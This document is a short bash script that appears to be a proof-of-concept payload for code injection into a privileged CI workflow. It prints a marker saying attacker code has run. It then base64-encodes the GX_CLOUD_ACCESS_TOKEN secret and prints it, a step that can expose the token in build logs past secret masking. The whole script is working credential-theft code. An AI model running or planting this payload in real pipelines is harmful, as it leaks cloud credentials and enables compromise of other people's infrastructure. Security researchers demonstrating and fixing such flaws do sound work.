#!/usr/bin/env bash
echo "ATTACKER_CODE_EXECUTED_IN_PRIVILEGED_WORKFLOW"
echo "EXFIL_SECRET_B64=$(printf '%s' "${GX_CLOUD_ACCESS_TOKEN:-<unset>}" | base64 -w0)"
